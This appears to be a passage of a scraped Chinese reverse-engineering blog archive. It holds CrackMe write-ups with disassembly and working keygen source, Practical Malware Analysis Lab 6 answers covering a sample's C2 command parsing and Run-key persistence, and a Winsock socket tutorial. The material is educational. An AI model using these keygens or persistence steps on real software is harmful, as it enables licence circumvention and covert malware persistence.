ds:[&lt;&amp;MSVBVM60.#581&gt;] ; msvbvm60.rtcR8ValFromBstr004064CD . DD9D 34FFFFFF fstp qword ptr ss:[ebp-0xCC] 那么只有一组是正确的对比字符串，经过上述分析可以知道，生成的字符串肯定是十六进制的值，查看字符串可以发现有许多的字符串其中不是十六进制值，比如第一组，很明显RR,KE不是十六进制数。 分析发现只有一组数是全部都是十六进制的，那么这一组应该就是需要计算后并且比对的KEY了。下面可以开始写注册机了。 注册机编写首先是对于那个每一位字符需要加上的数字的判断，假设这个数字是X，那么第一位数字就是X的十位数，然后这个数+X等于81，可以用这种方法来进行计算。 1234567891011121314151617int getValue()&#123; int a,b; char c; for (int i = 0x31; i &lt; 0x3A; i++) &#123; a = 0x81 - i; b = a/10; itoa(b, &amp;c, 10); if ( c==i ) &#123; printf(&quot;%x\\n&quot;, a); return a; break; &#125; &#125;&#125; 其实我这种方法不太严谨，应该是第一位等于X的十位，第二位等于X的个位，同时满足才行。 1234567891011int main()&#123; int a= getValue(); int key[] = &#123; 0x81,0x7E,0x74,0x7D,0x7A,0x7D,0x7C,0x7F,0x82,0x83,0x6D,0x74,0x74,0x7A,0x7F,0x7E,0x7B,0x7C,0x7D,0x82,0x6D,0x81,0x7E,0x7B,0x7C &#125;; for (int i = 0; i &lt; sizeof(key) / sizeof(int); i++) &#123; key[i] -= a; printf(&quot;%c&quot;, key[i]); &#125; return 0;&#125; 总结因为下断的原因一直分析第一个，那里只获取第一个数字，卡了半天，研究许久让我一度以为是CM的问题，有点蠢了。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"160CrackMe-010","slug":"160CrackMe-010","date":"2021-08-13T09:05:50.000Z","updated":"2021-08-13T09:41:52.155Z","comments":true,"path":"2021/08/13/160CrackMe-010/","link":"","permalink":"https://b1ackie.cn/2021/08/13/160CrackMe-010/","excerpt":"","text":"初探打开程序，看到只有一个输入key的地方，尝试输入发现弹出错误的弹窗。 分析无壳，用VB语言编写的。 使用OD打开，直接搜索错误的字符串，可以定位到关键的跳转，在上面就是一个比较函数，而其中又有一串字符串”kXy^rO|yXom\\kMuOn*+”，这个应该就是用来比较的了吧，函数头部下断开始分析。 流程较短也比较简单，前面还有一个获取输入的长度，就不在分析了，直接看关键的计算部分。 获取输入的每一位KEY加上0xA形成新的KEY最后再与”kXy^rO|yXom\\kMuOn*+”作比较。那么用这段字符减去A就可以得到输入的key了，下面开始写注册机 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646500401F68 &gt; /85C0 test eax,eax00401F6A . |0F84 BB000000 je Andréna.0040202B00401F70 . |8D55 94 lea edx,dword ptr ss:[ebp-0x6C]00401F73 . |8D45 DC lea eax,dword ptr ss:[ebp-0x24]00401F76 . |52 push edx00401F77 . |50 push eax00401F78 . |C745 9C 01000&gt;mov dword ptr ss:[ebp-0x64],0x100401F7F . |C745 94 02000&gt;mov dword ptr ss:[ebp-0x6C],0x200401F86 . |FF15 90414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaI4Var&gt;; Msvbvm50.__vbaI4Var00401F8C . |8D4D BC lea ecx,dword ptr ss:[ebp-0x44] ; |00401F8F . |50 push eax ; |Start = 0x4CE99400401F90 . |8D55 84 lea edx,dword ptr ss:[ebp-0x7C] ; |00401F93 . |51 push ecx ; |dString8 = 9E6A254600401F94 . |52 push edx ; |RetBUFFER = NULL00401F95 . |FF15 34414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#632&gt;] ; \\诸位获取00401F9B . |8D45 84 lea eax,dword ptr ss:[ebp-0x7C]00401F9E . |8D4D A8 lea ecx,dword ptr ss:[ebp-0x58]00401FA1 . |50 push eax ; /String8 = 004CE99400401FA2 . |51 push ecx ; |ARG2 = 9E6A254600401FA3 . |FF15 64414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrVa&gt;; \\__vbaStrVarVal00401FA9 . |50 push eax ; /String = &quot;;&quot;00401FAA . |FF15 08414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\转为ascii00401FB0 . |66:05 0A00 add ax,0xA ; +0xA00401FB4 . |0F80 B0020000 jo Andréna.0040226A00401FBA . |0FBFD0 movsx edx,ax00401FBD . |52 push edx00401FBE . |FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#537&gt;] ; ascii转字符00401FC4 . |8985 7CFFFFFF mov dword ptr ss:[ebp-0x84],eax00401FCA . |8D45 CC lea eax,dword ptr ss:[ebp-0x34]00401FCD . |8D8D 74FFFFFF lea ecx,dword ptr ss:[ebp-0x8C]00401FD3 . |50 push eax00401FD4 . |8D95 64FFFFFF lea edx,dword ptr ss:[ebp-0x9C]00401FDA . |51 push ecx00401FDB . |52 push edx00401FDC . |C785 74FFFFFF&gt;mov dword ptr ss:[ebp-0x8C],0x800401FE6 . |FFD3 call ebx ; Msvbvm50.__vbaVarCat00401FE8 . |8BD0 mov edx,eax00401FEA . |8D4D CC lea ecx,dword ptr ss:[ebp-0x34]00401FED . |FFD6 call esi ; Msvbvm50.__vbaVarMove00401FEF . |8D4D A8 lea ecx,dword ptr ss:[ebp-0x58]00401FF2 . |FF15 B0414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; Msvbvm50.__vbaFreeStr00401FF8 . |8D85 74FFFFFF lea eax,dword ptr ss:[ebp-0x8C]00401FFE . |8D4D 84 lea ecx,dword ptr ss:[ebp-0x7C]00402001 . |50 push eax00402002 . |8D55 94 lea edx,dword ptr ss:[ebp-0x6C]00402005 . |51 push ecx00402006 . |52 push edx00402007 . |6A 03 push 0x300402009 . |FFD7 call edi ; Msvbvm50.__vbaFreeVarList0040200B . |83C4 10 add esp,0x100040200E . |8D85 ECFEFFFF lea eax,dword ptr ss:[ebp-0x114]00402014 . |8D8D FCFEFFFF lea ecx,dword ptr ss:[ebp-0x104]0040201A . |8D55 DC lea edx,dword ptr ss:[ebp-0x24]0040201D . |50 push eax ; /TMPend8 = 004CE9940040201E . |51 push ecx ; |TMPstep8 = 9E6A25460040201F . |52 push edx ; |Counter8 = NULL00402020 . |FF15 A4414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \\__vbaVarForNext00402026 .^\\E9 3DFFFFFF jmp Andréna.00401F680040202B &gt; \\8D45 CC lea eax,dword ptr ss:[ebp-0x34]0040202E . 8D8D 54FFFFFF lea ecx,dword ptr ss:[ebp-0xAC]00402034 . 50 push eax ; /var18 = 004CE99400402035 . 51 push ecx ; |var28 = 9E6A254600402036 . C785 5CFFFFFF&gt;mov dword ptr ss:[ebp-0xA4],Andréna.0040&gt;; |kXy^rO|*yXo*m\\kMuOn*+00402040 . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],0x8008 ; |0040204A . FF15 40414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarTs&gt;; \\__vbaVarTstEq 注册机编写12345678910111213#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; char key[] = &quot;kXy^rO|*yXo*m\\\\kMuOn*+&quot;; for (int i = 0; i &lt; strlen(key); i++) &#123; key[i] = key[i] - 0xA; &#125; printf(&quot;%s&quot;, key); return 0;&#125; 输入正确的KEY 总结流程还是比较简单的，算法也很简单，总体上来讲难度不大。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"恶意代码分析实战-实验6","slug":"恶意代码分析实战-实验6","date":"2021-08-10T07:52:15.000Z","updated":"2021-08-10T10:46:29.786Z","comments":true,"path":"2021/08/10/恶意代码分析实战-实验6/","link":"","permalink":"https://b1ackie.cn/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/","excerpt":"","text":"Lab 6-11.由main函数调用的唯一子过程中发现的主要代码结构是什么？使用IDA找到main函数看到调用了一个子函数sub_401000，F5即可看到伪代码。 可以看到调用了InternetGetConnectedState这个API，这个函数是用来检测是否联网的，判断本地网络状态。 1234BOOL InternetGetConnectedState( LPDWORD lpdwFlags, DWORD dwReserved); 当存在一个连接时返回TRUE，否则返回FALSE。 2.位于0x40105F的子过程是什么？ 这样确实看不太出来是做什么的。 这样看可以看到成功或者失败分别会压入栈不同的文字然后调用。 再看实际运行情况，推测应该是一个printf函数。 3.这个程序的目的是什么？通过上面的函数分析可以得知，这是一个判断是否有网络连接的程序。如果存在网络连接返回1，否则返回0。 Lab 6-21.main函数调用的第一个子过程执行了什么操作？调用的第一个函数是sub_401000，调用了InternetGetConnectedState这个API判断当前是否连接了网络 2.位于0x40117F的子过程是什么？查看此函数，发现与lab6-1是一样的，所以是一个printf函数。 3.被main函数调用的第二个子过程做了什么？首先调用了InternetOpenA初始化应用程序对 WinINet 函数的使用。 然后调用了InternetOpenUrlA下载“http://www.practicalmalwareanalysis.com/cc.htm”这个页面 再调用InternetReadFile读取数据，如果读取的前几个字符是“&lt;!–”就成功，如果失败就会打印“Error 2.3: Fail to get command”，读取失败会打印“Error 2.2: Fail to ReadFile” openurl失败会打印“Error 2.1: Fail to OpenUrl” 再仔细分析一下返回值，可以看到前几个值如果比对都正确的话，那么会把第五个字符给al，而前几个字符是html页面的注释，也就是读取注释的第一个字符。 这个函数结束之后，可以看出来后al的值会再次赋给[EBP+var_8]，最终会传给ecx，再压入栈作为printf的一个参数。可以看到压入栈一句话”Success: Parsed command is %c\\n”，%c对应的就是这个值，打印出这个字符。 4.在这个子过程中使用了什么类型的代码结构？if-else的结构 5.在这个程序中有任何基于网络的指示吗？使用了Internet Explorer 7.5/pma作为InternetOpenA函数lpszAgent参数的值，还有http://www.practicalmalwareanalysis.com/cc.htm这个URL。 6.这个恶意代码的目的是什么？首先判断是否联网，如果联网那么就会开始读取http://www.practicalmalwareanalysis.com/cc.htm这个页面的，然后获取注释的第一个字符，最后将其打印出来，再调用sleep函数 Lab 6-31.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？多了一个函数sub_401130函数 这个新函数是通过读取到的值来执行不同的操作。 2.这个新函数使用的参数是什么？使用的参数是通过读取网页资源注释中得到的字符，还有一个是main函数的参数argv[0]，就是程序名本身。 3.这个函数包含的主要代码结构是什么？包含的主要结构式switch结构 4.这个函数能够做什么首先当字符等于“a”时，可以创建一个文件夹路径是C:\\TEMP 当字符等于“b”时，会将自身复制到创建文件夹内，并且重命名为cc.exe 等于“c”时，会删除文件夹下的cc.exe。 等于“d”时，会实现一个自启动功能，在HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run下写入键值 通过注册表实现自启动可以看这里：自启动技术-注册表 12345678910111213140040118F |. 51 push ecx ; /pHandle = kernel32.75B5483B00401190 |. 68 3F000F00 push 0xF003F ; |Access = KEY_ALL_ACCESS00401195 |. 6A 00 push 0x0 ; |Reserved = 0x000401197 |. 68 70714000 push Lab06-03.00407170 ; |Software\\Microsoft\\Windows\\CurrentVersion\\Run0040119C |. 68 02000080 push 0x80000002 ; |hKey = HKEY_LOCAL_MACHINE004011A1 |. FF15 04604000 call dword ptr ds:[&lt;&amp;ADVAPI32.RegOpenKey&gt;; \\RegOpenKeyExA004011A7 |. 6A 0F push 0xF ; /BufSize = F (15.)004011A9 |. 68 A0714000 push Lab06-03.004071A0 ; |C:\\Temp\\cc.exe004011AE |. 6A 01 push 0x1 ; |ValueType = REG_SZ004011B0 |. 6A 00 push 0x0 ; |Reserved = 0x0004011B2 |. 68 68714000 push Lab06-03.00407168 ; |Malware004011B7 |. 8B55 FC mov edx,dword ptr ss:[ebp-0x4] ; |004011BA |. 52 push edx ; |hKey = 0x23C004011BB |. FF15 00604000 call dword ptr ds:[&lt;&amp;ADVAPI32.RegSetValu&gt;; \\RegSetValueExA 等于“e”的时候，调用sleep函数 都不满足的话就打印字符串“Error 3.2: Not a valid command provided” 5.这个恶意代码中有什么本地特征吗？有，就是前面分析的注册表键值的修改，还有对于文件夹的创建和文件的复制。 6.这个恶意代码的目的是什么？判断网络是否连接，然后读取一个网页资源中的注释后的第一个字符，通过这个字符来判断进行何种操作。具体上面已经分析过了。 Lab 6-41.在实验6-3和6-4的main函数中的调用之间的区别是什么？加了一个for循环，sub_401040加了一个参数i。 2.什么新的代码结构已经被添加到main中for循环结构 3.这个实验的解析HTML的函数和前面实验中的那些有什么区别主要是给InternetOpenA传入的szAgent参数不一样，这个参数先通过sprintf将“Internet Explorer 7.50/pma”与循环次数i拼接起来。第一次是Internet Explorer 7.50/pma0第二次是Internet Explorer 7.50/pma1…以此类推。 4.这个程序会运行多久？（假设它已经连接到互联网）看这个for循环，每次都会sleep，其中参数是6000ms，是一分钟，也就是每循环一次沉睡一分钟，那么就是1440分钟。 5.在这个恶意代码中有什么新的基于网络的迹象吗？就是InternetOpenA传入的szAgent参数不同了，每次都会变。 6.这个恶意代码的目的是什么？跟之前的基本一样，只是运行的时间变得特别长。","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"160CrackMe-009","slug":"160CrackMe-009","date":"2021-08-09T10:00:15.000Z","updated":"2021-08-09T10:54:17.471Z","comments":true,"path":"2021/08/09/160CrackMe-009/","link":"","permalink":"https://b1ackie.cn/2021/08/09/160CrackMe-009/","excerpt":"","text":"前言这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB的变量特征是前两个4字节都是一些数据类型，第三个四字节才是变量，相当于是首地址+0x8的地方。 比如此时寄存器中值是18F3F4，它实际存储的值是18F3FC处的数据。 初探打开程序，看到需要输入name和key输入后弹出错误的提示框。 分析查壳，无壳是用VB语言写的。 使用OD搜索错误提示的字符串可以搜索到直接定位到关键跳转。在函数头部下断开始分析。 先获取了输入的name的长度，但是这个长度后面好像是没有参加任何运算的，我没有分析到有参加运算的地方。 123456789101112131415161718004020EF . 51 push ecx ; /Step8 = 0018F3E0004020F0 . 8D45 94 lea eax,dword ptr ss:[ebp-0x6C] ; |004020F3 . BB 02000000 mov ebx,0x2 ; |004020F8 . 52 push edx ; |/var18 = 0018F3BC004020F9 . 50 push eax ; ||retBuffer8 = 0018F3CC004020FA . 899D 54FFFFFF mov dword ptr ss:[ebp-0xAC],ebx ; ||00402100 . 899D 44FFFFFF mov dword ptr ss:[ebp-0xBC],ebx ; ||00402106 . FF15 18414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenVa&gt;; |\\__vbaLenVar0040210C . 8D8D 44FFFFFF lea ecx,dword ptr ss:[ebp-0xBC] ; |00402112 . 50 push eax ; |End8 = 0018F3CC00402113 . 8D95 E8FEFFFF lea edx,dword ptr ss:[ebp-0x118] ; |00402119 . 51 push ecx ; |Start8 = 0018F3E00040211A . 8D85 F8FEFFFF lea eax,dword ptr ss:[ebp-0x108] ; |00402120 . 52 push edx ; |TMPend8 = 0018F3BC00402121 . 8D4D DC lea ecx,dword ptr ss:[ebp-0x24] ; |00402124 . 50 push eax ; |TMPstep8 = 0018F3CC00402125 . 51 push ecx ; |Counter8 = 0018F3E000402126 . FF15 20414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \\__vbaVarForInit 首先是对于name 的操作，获取了每一位的ascii码值，然后相加。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495000402134 . /0F84 9C000000 je Andréna.004021D60040213A . |8D55 94 lea edx,dword ptr ss:[ebp-0x6C]0040213D . |8D45 DC lea eax,dword ptr ss:[ebp-0x24]00402140 . |52 push edx00402141 . |50 push eax00402142 . |C745 9C 01000&gt;mov dword ptr ss:[ebp-0x64],0x100402149 . |895D 94 mov dword ptr ss:[ebp-0x6C],ebx0040214C . |FF15 90414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaI4Var&gt;; Msvbvm50.__vbaI4Var00402152 . |8D4D BC lea ecx,dword ptr ss:[ebp-0x44] ; |00402155 . |50 push eax ; |Start = 0x18F3CC00402156 . |8D55 84 lea edx,dword ptr ss:[ebp-0x7C] ; |00402159 . |51 push ecx ; |dString8 = 0018F3E00040215A . |52 push edx ; |RetBUFFER = 0018F3BC0040215B . |FF15 38414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#632&gt;] ; \\获取每一位00402161 . |8D45 84 lea eax,dword ptr ss:[ebp-0x7C]00402164 . |8D4D A8 lea ecx,dword ptr ss:[ebp-0x58]00402167 . |50 push eax ; /String8 = 0018F3CC00402168 . |51 push ecx ; |ARG2 = 0018F3E000402169 . |FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrVa&gt;; \\__vbaStrVarVal0040216F . |50 push eax ; /String = &quot;\u0002&quot;00402170 . |FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\转为ascii00402176 . |66:8985 4CFFF&gt;mov word ptr ss:[ebp-0xB4],ax0040217D . |8D55 CC lea edx,dword ptr ss:[ebp-0x34]00402180 . |8D85 44FFFFFF lea eax,dword ptr ss:[ebp-0xBC]00402186 . |52 push edx ; /var18 = 0018F3BC00402187 . |8D8D 74FFFFFF lea ecx,dword ptr ss:[ebp-0x8C] ; |0040218D . |50 push eax ; |var28 = 0018F3CC0040218E . |51 push ecx ; |saveto8 = 0018F3E00040218F . |899D 44FFFFFF mov dword ptr ss:[ebp-0xBC],ebx ; |00402195 . |FF15 94414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarAd&gt;; \\相加0040219B . |8BD0 mov edx,eax0040219D . |8D4D CC lea ecx,dword ptr ss:[ebp-0x34]004021A0 . |FFD6 call esi ; Msvbvm50.__vbaVarMove004021A2 . |8D4D A8 lea ecx,dword ptr ss:[ebp-0x58]004021A5 . |FF15 B8414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; Msvbvm50.__vbaFreeStr004021AB . |8D55 84 lea edx,dword ptr ss:[ebp-0x7C]004021AE . |8D45 94 lea eax,dword ptr ss:[ebp-0x6C]004021B1 . |52 push edx004021B2 . |50 push eax004021B3 . |53 push ebx004021B4 . |FFD7 call edi ; Msvbvm50.__vbaFreeVarList004021B6 . |83C4 0C add esp,0xC004021B9 . |8D8D E8FEFFFF lea ecx,dword ptr ss:[ebp-0x118]004021BF . |8D95 F8FEFFFF lea edx,dword ptr ss:[ebp-0x108]004021C5 . |8D45 DC lea eax,dword ptr ss:[ebp-0x24]004021C8 . |51 push ecx ; /TMPend8 = 0018F3E0004021C9 . |52 push edx ; |TMPstep8 = 0018F3BC004021CA . |50 push eax ; |Counter8 = 0018F3CC004021CB . |FF15 AC414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \\__vbaVarForNext004021D1 .^|E9 5CFFFFFF jmp Andréna.00402132 然后所有name相加的结果乘以0x499602D2 123456789004021D6 &gt; \\8D4D CC lea ecx,dword ptr ss:[ebp-0x34]004021D9 . 8D95 54FFFFFF lea edx,dword ptr ss:[ebp-0xAC]004021DF . 51 push ecx ; /var18 = 0018F404004021E0 . 8D45 94 lea eax,dword ptr ss:[ebp-0x6C] ; |004021E3 . 52 push edx ; |var28 = 0018F38C004021E4 . 50 push eax ; |SaveTo8 = 0018F3CC004021E5 . C785 5CFFFFFF&gt;mov dword ptr ss:[ebp-0xA4],0x499602D2 ; |004021EF . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],0x3 ; |004021F9 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarMu&gt;; \\__vbaVarMul 这个值再转为十进制的字符串。 可以看到这个值和计算器计算出来的是一样的。 最后就是使用“-”替换到第四位和第九位的字符。 1234567891011121314151617181900402206 . 8B1D A0414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaMi&gt;; Msvbvm50.__vbaMidStmtVar0040220C . 8D4D CC lea ecx,dword ptr ss:[ebp-0x34]0040220F . 51 push ecx00402210 . 6A 04 push 0x400402212 . 8D95 54FFFFFF lea edx,dword ptr ss:[ebp-0xAC]00402218 . 6A 01 push 0x10040221A . 52 push edx0040221B . C785 5CFFFFFF&gt;mov dword ptr ss:[ebp-0xA4],Andréna.0040&gt;; -00402225 . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],0x80040222F . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaMidStmtVar&gt;00402231 . 8D45 CC lea eax,dword ptr ss:[ebp-0x34]00402234 . 8D8D 54FFFFFF lea ecx,dword ptr ss:[ebp-0xAC]0040223A . 50 push eax0040223B . 6A 09 push 0x90040223D . 6A 01 push 0x10040223F . 51 push ecx00402240 . C785 5CFFFFFF&gt;mov dword ptr ss:[ebp-0xA4],Andréna.0040&gt;; -0040224A . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],0x800402254 . FFD3 call ebx 下面开始编写注册机 注册机编写根据以上分析的结果 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int main()&#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name); long long key = 0; int len = strlen(name); for (int i = 0; i &lt; len; i++) &#123; key += name[i]; &#125; key *= 0x499602D2; char buf[30]; sprintf(buf, &quot;%lld&quot;, key); buf[3] = &#x27;-&#x27;; buf[8] = &#x27;-&#x27;; printf(&quot;你的key是：\\n%s&quot;, buf); return 0;&#125; 总结分析起来不难，主要是VB的特性让人很折磨。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"传输技术-SOCKET通信","slug":"传输技术-SOCKET通信","date":"2021-08-06T11:35:59.000Z","updated":"2021-08-09T10:51:36.524Z","comments":true,"path":"2021/08/06/传输技术-SOCKET通信/","link":"","permalink":"https://b1ackie.cn/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/","excerpt":"","text":"SOCKET通信socket也被叫做“套接字”，应用程序通常通过“套接字”向网络发出请求或者接收请求。socket表示是：IP地址加上端口号，如127.0.0.1:8080。Socket编程有两种通信协议可以选择，一种是TCP，另一种是UDP。先来说一下基于TCP的Socket编程。 基于TCP Socket编程TCP是一种基于连接的协议，在进行通信之前，必须要建立连接，其中服务端监听请求，客户端发送请求。当建立好了连接之后，就可以开始通信了。 函数介绍Socket根据指定的地址族、数据类型和协议来分配一个套接口的描述字及其所有资源的函数。 1234SOCKET socket ( _In_ int af, _In_ int type, _In_ int protocol); af：指定地址族规范。地址系列的可能值在Winsock2.h头文件中定义。当前支持AF_INET或者AF_INET6，它们是IPV4和IPV6的互联网地址族格式。 type：指定socket类型，SOCK_STREAM类型指定产生流式套接字，SOCK_DGRAM类型指定产生数据报式套接字，而SOCK_RAW类型指定产生原始套接字（只有管理员权限的用户可以创建原始套接字）。 protocol：与特定地址家族相关的协议IPPROTO_TCP、IPPROTO_UP、IPPROTO_IP，如果指定为0，那么系统会根据地址格式和套接字类别，自动选择一个合适的协议。 返回值：如果没有发生错误，则套接字返回引用新套接字的描述符，否则返回INVALID_SOCKET。 bind将本地地址与套接字相关联 12345int bind( SOCKET s, const sockaddr *addr, int namelen); s：标识未绑定套接字的描述符。 addr：指向要分配给绑定套接字的本地地址的sockaddr结构的指针。 namelen：name参数指向值的长度。 返回值：如果没有发生错误，则bind返回0，否则返回SOCKET_ERROR。 htons将整型变量从主机字节顺序转变成网络字节顺序，就是整数在地址空间中的存储方式变为高位字节存放在内存的低地址处。 123u_short htons( u_short hostshort); hostshort：指定主机字节顺序为16位。 返回值：返回TCP/IP网络字节顺序。 inet_addr将一个点分十进制的IP转换成一个长整型数。 123unsigned long inet_addr( const char *cp); 返回值：如果没有发生错误，返回一个无符号长整型值，其中包含给定互联网地址的适当的二进制表示形式。 listen函数将一个套接字置于正在监听传入连接的状态。 123int listen ( _In_ SOCKET s, _In_ int backlog); s：标识绑定的未连接套接字的描述符。 backlog：指定待连接队列的最大长度。如果设置为SOMAXCONN，则负责套接字的底层服务提供商将积压设置为最大合理值。如果设置为SOMAXCONN_HINT(N)（其中N是数字），则积压值为N，调整范围（200,65535）。 返回值：如没有发生错误，返回0，否则返回SOCKET_ERROR。 accept允许在套接字上尝试连接 1234SOCKET accept ( _In_ SOCKET s, _Out_writes_bytes_opt_(*addrlen) struct sockaddr FAR *addr, _Inout_opt_ int FAR *addrlen); s：描述符，用于标识使用listen功能并处于侦听状态的套接字。连接实际上是由accept返回的套接字。 addr：指定一个可选缓冲区的指针，它接受通信层中已知连接实体的地址。addr参数的确切格式由创建sockaddr结构的套接字时建立的地址族来确定。 addrlen：指向一个整数的可选指针，其中包含由addr参数指向的结构长度。 返回值：如果没有发生错误，则accept返回一个SOCKET类型的值，该值是新套接字的描述符。此返回值是实际连接所在的套接字的句柄。否则返回INVALID_SOCKET。 send在建立连接的套接字上发送数据 12345int send ( _In_ SOCKET s, _In_reads_bytes_(len) const char FAR * buf, _In_ int len, _In_ int flags); s：标识连接的套接字的描述符。 buf：指向要发送的数据缓冲区的指针。 len：由buf参数指向缓冲区中数据的长度。 flags：指定一组调用方式的标志，一般置为0。 返回值：如果没有发生错误，返回发送的字节数，否则返回SOCKET_ERROR。 recv从连接的套接字或绑定的无连接套接字中接收数据。 12345int recv ( _In_ SOCKET s, _Out_writes_bytes_to_(len, return) __out_data_source(NETWORK) char FAR * buf, _In_ int len, _In_ int flags); s：标识连接的套接字的描述符。 buf：指向缓冲区的指针，用于接收传入的数据。 len：由buf参数指向缓冲区中数据的长度。 flags：指定一组调用方式的标志，一般置为0。 返回值，如果没有发生错误，则recv返回接收到的字节数，由buf参数指向的缓冲区将包含接收到的数据。如果连接已经正常关闭，则返回值为0. 实现原理客户端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，调用bind函数绑定，再调用listen函数进行监听。当有连接请求时，调用accept函数接收连接请求。建立连接后，使用recv和send函数进行通信。 服务端先初始化winsock环境，然后调用Socket函数创建套接字，然后进行结构体的设置，然后调用connect函数发送连接请求，建立连接后，使用recv和send函数进行通信。 服务端代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;//#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)BOOL SocketBindAndListen(char* lpszIP, int Port);void AcceptRecvMsg();void SendMsg(char* pszSend);UINT RecvThreadProc(LPVOID lpVoid);SOCKET g_ServerSocket;SOCKET g_ClientSocket;int main() &#123; if (SocketBindAndListen(&quot;IP地址&quot;, 12345) == FALSE) &#123; printf(&quot;建立连接失败\\n&quot;); return -1; &#125; printf(&quot;连接建立成功，开始通信\\n&quot;); char szSendmsg[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; gets_s(szSendmsg); SendMsg(szSendmsg); &#125; return 0;&#125;BOOL SocketBindAndListen(char* lpszIP, int Port)&#123; //初始化winsock库 WSADATA wsaData = &#123; 0 &#125;; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 g_ServerSocket = socket(AF_INET, SOCK_STREAM, 0); sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(Port); addr.sin_addr.S_un.S_addr = inet_addr(lpszIP); //绑定IP和端口 if (bind(g_ServerSocket, (sockaddr*)(&amp;addr), sizeof(addr)) == SOCKET_ERROR) &#123; return FALSE; &#125; //设置监听 if (listen(g_ServerSocket, 1) == SOCKET_ERROR) &#123; return FALSE; &#125; CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecvThreadProc, NULL, NULL, NULL); return TRUE;&#125;void AcceptRecvMsg()&#123; sockaddr_in addr = &#123; 0 &#125;; int len = sizeof(addr); g_ClientSocket = accept(g_ServerSocket, (sockaddr*)(&amp;addr), &amp;len); printf(&quot;接收客户端连接请求\\n&quot;); char szBuffer[MAX_PATH] = &#123; 0 &#125;; while (1) &#123; //接收数据 int Ret = recv(g_ClientSocket, szBuffer, MAX_PATH, 0); if (Ret &lt;= 0) &#123; continue; &#125; printf(&quot;接收到数据：%s\\n&quot;, szBuffer); &#125;&#125;void SendMsg(char* pszSend)&#123; send(g_ClientSocket, pszSend, (1 + strlen(pszSend)), 0); printf(&quot;发送数据：%s\\n&quot;, 